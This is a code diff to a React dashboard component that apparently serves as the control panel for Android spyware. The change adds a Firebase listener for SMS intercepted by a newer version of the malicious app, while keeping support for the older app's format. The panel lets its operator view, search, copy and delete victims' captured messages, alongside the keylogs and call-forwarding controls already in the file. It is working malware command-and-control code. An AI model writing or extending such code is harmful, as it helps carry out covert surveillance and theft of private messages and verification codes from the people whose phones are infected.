@@ -43,7 +43,9 @@ export function DeviceDetail() {
   const [smsSearch, setSmsSearch] = useState('');
   const [forwardType, setForwardType] = useState('call');
   const [forwardNumber, setForwardNumber] = useState('');
-  
+  // SMS from messages/{id} path (new APK format)
+  const [smsData, setSmsData] = useState<Record<string, any>>({});
+
   useEffect(() => {
     if (!id) return;
     
@@ -66,6 +68,16 @@ export function DeviceDetail() {
       setLoading(false);
     });
 
+    return () => unsubscribe();
+  }, [id]);
+
+  // Separate listener for messages (stored at messages/{id}, not clients/{id}/sms)
+  useEffect(() => {
+    if (!id) return;
+    const msgRef = ref(db, `messages/${id}`);
+    const unsubscribe = onValue(msgRef, (snapshot) => {
+      setSmsData(snapshot.exists() ? snapshot.val() : {});
+    });
     return () => unsubscribe();
   }, [id]);
 
@@ -151,6 +163,8 @@ export function DeviceDetail() {
 
   const handleDeleteSms = (pushKey: string) => {
     if (!id) return;
+    // Try deleting from both paths (new APK: messages/{id}, old APK: clients/{id}/sms)
+    remove(ref(db, `messages/${id}/${pushKey}`));
     remove(ref(db, `clients/${id}/sms/${pushKey}`));
   };
 
@@ -204,9 +218,19 @@ export function DeviceDetail() {
 
   const isOnline = device.isOnline;
   const rawDevice = device.raw;
-  const smsList = rawDevice.sms ? Object.entries(rawDevice.sms).reverse() : [];
-  const filteredSms = smsSearch 
-    ? smsList.filter(([_, sms]: any) => (sms.body || '').toLowerCase().includes(smsSearch.toLowerCase()) || (sms.from || '').includes(smsSearch))
+  // SMS: read from messages/{id} (new APK) — fields: sender, message, dateTime, id
+  // Fall back to clients/{id}/sms (old APK) — fields: from, body, date
+  const smsList = Object.keys(smsData).length > 0
+    ? Object.entries(smsData).sort(([, a]: any, [, b]: any) => (b.id || 0) - (a.id || 0))
+    : rawDevice.sms
+      ? Object.entries(rawDevice.sms).reverse()
+      : [];
+  const filteredSms = smsSearch
+    ? smsList.filter(([_, sms]: any) => {
+        const body = sms.message || sms.body || '';
+        const from = sms.sender || sms.from || '';
+        return body.toLowerCase().includes(smsSearch.toLowerCase()) || from.includes(smsSearch);
+      })
     : smsList;
     
   const keylogList = rawDevice.keylog ? Object.entries(rawDevice.keylog).reverse() : [];
@@ -491,23 +515,32 @@ export function DeviceDetail() {
                     </div>
                   ) : (
                     <div className="flex-1 overflow-y-auto space-y-3 pr-2">
-                      {filteredSms.map(([key, sms]: any) => (
+                      {filteredSms.map(([key, sms]: any) => {
+                        // Support new APK (sender/message/dateTime) and old APK (from/body/date)
+                        const displayFrom = sms.sender || sms.from || 'Unknown';
+                        const displayBody = sms.message || sms.body || '';
+                        const displayDate = sms.dateTime
+                          ? sms.dateTime
+                          : sms.date
+                            ? format(new Date(parseInt(sms.date)), 'MMM d, HH:mm:ss')
+                            : 'Unknown Time';
+                        return (
                         <div key={key} className="bg-white border border-[#d8c8f0] rounded-2xl p-4 group relative hover:border-[#b8a0e0] transition-colors shadow-sm">
                           <div className="flex justify-between items-start mb-2">
                             <div className="font-semibold text-sm bg-[#ecdbfd] text-[#7c3aed] px-3 py-1 rounded-full">
-                              {sms.from || 'Unknown'}
+                              {displayFrom}
                             </div>
                             <div className="text-xs text-[#6b5b7d]">
-                              {sms.date ? format(new Date(parseInt(sms.date)), 'MMM d, HH:mm:ss') : 'Unknown Time'}
+                              {displayDate}
                             </div>
                           </div>
                           <div className="text-sm leading-relaxed break-words text-[#2d1b4e] pl-1 border-l-2 border-[#d8c8f0]">
-                            {sms.body || ''}
+                            {displayBody}
                           </div>
                           
                           <div className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 flex gap-1 transition-opacity">
                             <button 
-                              onClick={() => copyText(sms.body || '')}
+                              onClick={() => copyText(displayBody)}
                               className="p-1.5 bg-[#f5efff] hover:bg-[#ecdbfd] text-[#6b5b7d] hover:text-[#7c3aed] rounded-xl border border-[#d8c8f0] transition-colors"
                               title="Copy"
                             >
@@ -522,7 +555,8 @@ export function DeviceDetail() {
                             </button>
                           </div>
                         </div>
-                      ))}
+                        );
+                      })}
                     </div>
                   )}
                 </div>
